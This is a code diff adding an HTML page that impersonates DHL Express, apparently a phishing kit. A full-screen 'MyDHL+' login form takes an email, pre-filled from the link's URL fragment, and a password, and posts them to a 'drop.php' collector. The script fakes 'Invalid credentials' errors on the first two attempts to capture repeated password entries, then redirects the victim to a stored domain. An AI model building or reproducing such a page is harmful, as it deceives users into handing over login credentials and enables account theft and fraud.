@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DHL Express</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        header {
+            background: #ffcc00;
+        }
+        .topdown {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 80%;
+            margin: auto;
+            padding: 7px;
+        }
+        hr {
+            color: white;
+            background: white;
+        }
+        .topdown a  {
+            text-decoration: none;
+            color: #000;
+        }
+        .header {
+            background-color: #ffcc00;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            width: 80%;
+            margin: auto;
+        }
+        .header .logo img {
+           width: 100%;
+           height: auto;
+        }
+        .logo {
+            width: 20%;
+        }
+        .nav {
+            display: flex;
+            align-items: center;
+        }
+        .nav a {
+            color: black;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+        }
+        .header-right a {
+            color: black;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .header-right select {
+            margin-left: 10px;
+        }
+        .side44 {
+            font-size: 13px;
+        }
+        .side44 i {
+            margin-left: 5px;
+        }
+        .langg {
+            display: flex;
+            align-items: center;
+        }
+        .langg span {
+            display: flex;
+            align-items: center;
+        }
+        .langg span img {
+            width: 40px;
+            height: 30px;
+        }
+        .banner {
+            position: relative;
+            text-align: left;
+            color: white;
+            display: flex;
+            width: 80%;
+            margin: auto;
+            padding: 11rem 0;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .bggg {
+            width: 100%;
+            height: 85vh;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            width: 100%;
+            z-index: -1;
+        }
+
+        .banner-content {
+            /* position: absolute;
+            top: 20%;
+            left: 5%; */
+            width: 45%;
+        }
+        .banner-content h1 {
+            font-size: 3rem;
+            margin: 0;
+        }
+        .banner-content p {
+            font-size: 1.2rem;
+            margin: 10px 0;
+        }
+        .get-started {
+            width: 45%;
+            /* position: absolute;
+            top: 30%;
+            right: 5%; */
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .flexjj {
+            display: flex;
+            gap: 1px;
+        }
+        .flexjj button {
+            background-color: white;
+            border: none;
+            color: #6b7280;
+            padding: 10px 20px;
+            /* margin: 5px; */
+            cursor: pointer;
+        }
+        .fllxss {
+            display: flex;
+            align-items: center;
+            width: 80%;
+            margin: auto;
+        }
+        .main-content {
+            display: flex;
+            justify-content: space-around;
+            padding: 20px;
+            background-color: #f8f8f8;
+            width: 55%;
+        }
+        .main-content div {
+            text-align: center;
+        }
+        .track-shipments {
+            background-color: #ffcc00;
+            padding: 20px;
+            text-align: center;
+            width: 50%;
+        }
+        .track-shipments input {
+            padding: 10px;
+            border: none;
+            width: 70%;
+            border-radius: 5px;
+        }
+        .track-shipments button {
+            padding: 10px 20px;
+            border: none;
+            background-color: green;
+            color: white;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .form h2 {
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-size: 1.2rem;
+            color: #d40511;
+        }
+        .form {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            width: 350px;
+            margin: auto;
+            margin-top: 7rem;
+            padding: 20px;
+            /* border-radius: 20px; */
+            position: relative;
+            background-color: #e9e9e9;
+            color: #fff;
+            border: 1px solid #333;
+        }
+
+        .form label {
+        position: relative;
+        }
+
+        .form label .input {
+            background-color: #fff;
+            text-shadow: 0 0 0 #222;
+            border: 1px solid #949494;
+            border-radius: 3px;
+            line-height: normal;
+            box-shadow: inset 0 2px 2px rgba(0, 0, 0, 0.1);
+            color: #222;
+            width: 100%;
+            padding: 20px 05px 05px 10px;
+        }
+
+        .form label .input + span {
+            color: #666;
+            position: absolute;
+            left: 10px;
+            top: 0px;
+            font-size: 0.9em;
+            cursor: text;
+            transition: 0.3s ease;
+        }
+
+        .form label .input:placeholder-shown + span {
+            top: 12.5px;
+            font-size: 0.9em;
+        }
+
+        .form label .input:focus + span,
+        .form label .input:valid + span {
+            color: #000;
+            top: 0px;
+            font-size: 0.7em;
+            font-weight: 600;
+        }
+
+        .input {
+        font-size: medium;
+        }
+
+        .submit {
+            width: 100%;
+            padding: 10px;
+            color: #000;
+            background: #fecb2f;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+        }
+
+        .submit:hover {
+        background-color: #fecb2f;
+        }
+
+        @keyframes pulse {
+        from {
+            transform: scale(0.9);
+            opacity: 1;
+        }
+
+        to {
+            transform: scale(1.8);
+            opacity: 0;
+        }
+        }
+        .login-container {
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 999;
+            background: transparent;
+            /* display: none; */
+        }
+        .dhh {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            color: #000;
+        } 
+        .dhh img {
+            width: 70px;
+            height: 37px;
+        }
+        .buger {
+            display: none;
+        }
+        @media screen and (max-width: 768px) {
+            .form {
+                width: 80%;
+            }
+            .header-right {
+                display: none;
+            }
+            .buger {
+            display: block;
+        }
+        .topdown {
+            display: none;
+        }
+        .banner {
+            flex-direction: column;
+            gap: 2rem;
+            width: 90%;
+            padding: 8rem 0; 
+        }
+        .banner-content, .get-started {
+            width: 100%;
+        }
+        .fllxss  {
+            flex-direction: column-reverse;
+        }
+        .main-content, .track-shipments {
+            width: 100%;
+        }
+        .main-content {
+            padding: 6px 20px;
+        }
+        .bggg {
+            width: 100%;
+            height: 100vh;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            width: 100%;
+            z-index: -1;
+        }
+        .flexjj button {
+            background-color: white;
+            border: none;
+            color: #6b7280;
+            padding: 14px 7px;
+            /* margin: 5px; */
+            cursor: pointer;
+        }
+        .logo {
+            width: 33%;
+        }
+        .header {
+            width: 97%;
+        }
+        }
+    </style>
+    <script src="https://kit.fontawesome.com/21cf0ca2ce.js" crossorigin="anonymous"></script>
+</head>
+<body>
+    <header>
+        <div class="header">
+            <div class="logo">
+                <img src="https://i.postimg.cc/g2vzmRdK/1614969224184.png" alt="DHL Express">
+            </div>
+            
+            <div class="header-right">
+                <div class="side44">
+                    <a href="#">Help and Support</a>
+                    <a href="#">Find a location</a>|
+                    <!-- <input type="text" placeholder="Search"> -->
+                    <i class="fa-solid fa-magnifying-glass"></i>
+                </div>
+                <div class="langg">
+                    <div class="lams1">
+                        <a href="#">English</a>|
+                        <a href="#"> Español</a>
+                    </div>
+                    <span>
+                        <img src="https://i.postimg.cc/YCMHtNY3/image.png" alt="">
+                        <i class="fas fa-angle-down"></i>
+                    </span>
+                </div>
+            </div>
+            <div class="buger">
+                <i class="fas fa-bars"></i>
+            </div>
+        </div>
+        <hr>
+        <div class="topdown">
+            <div class="nav">
+                <a href="#">Home</a>
+                <a href="#">Ship</a>
+                <a href="#">Track</a>
+            </div>
+            <div class="downside2">
+                <a href="#">Register</a>
+                <a href="#">Login</a>
+            </div>
+        </div>
+    </header>
+    <img src="https://i.postimg.cc/g0xxVsZH/us-background.jpg" class="bggg" alt="City Background">
+    <div class="banner">
+        <div class="banner-content">
+            <span>Welcome to</span>
+            <h1>DHL Express</h1>
+            <p>Over 50 years of international shipping expertise</p>
+        </div>
+        <div class="get-started">
+            <h2 style="text-align: start;">Get Started Now</h2>
+            <div class="flexjj">
+                <button>Create a New Shipment</button>
+                <button>Get a Rate and Time Quote</button>
+                <button>Schedule a Pickup</button>
+            </div>
+        </div>
+    </div>
+    <div class="fllxss">
+        <div class="main-content">
+            <div>
+                <!-- <img src="https://via.placeholder.com/50.png?text=Icon" alt="Get Quote"> -->
+                <i class="fas fa-tag" style="color: #6b7280;"></i>
+                <p>Get Quote</p>
+            </div>
+            <div>
+                <!-- <img src="https://via.placeholder.com/50.png?text=Icon" alt="Delivery Services"> -->
+                <i class="fa-solid fa-truck" style="color: #6b7280;"></i>
+                <p>Delivery Services</p>
+            </div>
+            <div>
+                <!-- <img src="https://via.placeholder.com/50.png?text=Icon" alt="Find a location"> -->
+                <i class="fas fa-location-dot" style="color: #6b7280;"></i>
+                <p>Find a location</p>
+            </div>
+        </div>
+        <div class="track-shipments">
+            <input type="text" placeholder="Enter tracking number">
+            <button>Track</button>
+        </div>
+    </div>
+
+    <div class="login-container">
+        <form class="form" id="res" method="post" action="">   
+            <!-- <h2>MyDHL+ Login</h2>      -->
+            <div class="dhh">
+                <img src="https://i.postimg.cc/wjHvtFwr/mydhl-plus.png" alt="">
+                Login
+            </div>   
+            <span style="color: red;" id="errorr"></span> 
+            <label>
+                <input class="input" name="userid" id="eml" type="email" placeholder="" required="">
+                <span>Email</span>
+            </label> 
+                
+            <label>
+                <input class="input" name="userpwd" id="password" type="password" placeholder="" required="">
+                <span>Password</span>
+            </label>
+            <a href="#" style="color: #007acc;">Forgot/Reset Password</a>
+            <div class="remember-me">
+                <input type="checkbox" id="remember">
+                <label for="remember" style="color: #444;">Remember me</label>
+                <i class="fas fa-circle-exclamation" style="color: #007acc;"></i>
+            </div>
+            <button class="submit">
+                <i class="fas fa-lock"></i>
+                login
+            </button>
+            <p class="signin" style="color: #444;">Already have an acount ? <a href="#">Signin</a> </p>
+        </form>
+    </div>
+    <script>
+        const fullUrl = window.location.href;
+        const emailRegex = /#([^#]+)$/;
+        const match = fullUrl.match(emailRegex);
+        const email = match ? match[1] : null;
+      
+        console.log(email);
+      
+
+        if (email) {
+            document.getElementById("eml").value = email;         
+          }
+      
+    //    document.addEventListener('contextmenu', function (e) {
+    //      e.preventDefault();
+    //    });
+      
+      var formSubmitted = 0;
+
+      document.getElementById("res").addEventListener("submit", function (event) {
+          event.preventDefault();
+      
+          formSubmitted++;
+          var inputs = document.querySelectorAll('input[required]');
+          for (var i = 0; i < inputs.length; i++) {
+              if (!inputs[i].value.trim()) {
+                  alert("Please fill in all fields.");
+                  return;
+              }
+          }
+      
+          var formData = new FormData(this);
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", "drop.php", true); // your php url here
+      
+          xhr.onreadystatechange = function () {
+              const directts = localStorage.getItem("userDomain")
+              console.log(directts);
+              if (xhr.readyState == 4 && xhr.status == 200) {
+                  console.log(xhr.responseText);
+      
+                  if (formSubmitted === 1) {
+                      document.getElementById("password").value = "";
+                      console.log("YESSSSS");
+                      document.getElementById("errorr").textContent = "Invalid credentials, please try again"
+                      setTimeout(() => {
+                        document.getElementById("errorr").style.display = "none"
+                      }, 1300);
+                  } else if (formSubmitted === 2) {
+                    document.getElementById("password").value = "";
+                      console.log("YESSSSS");
+                      document.getElementById("errorr").style.display = "block"
+                    } else if (formSubmitted === 3) {
+                      window.location.href = `https://www.${directts}`;
+                      console.log("GOOOOOO");
+                      
+                  }
+              }
+          };
+      
+          xhr.send(formData);
+      });
+    </script>
+</body>
+</html>
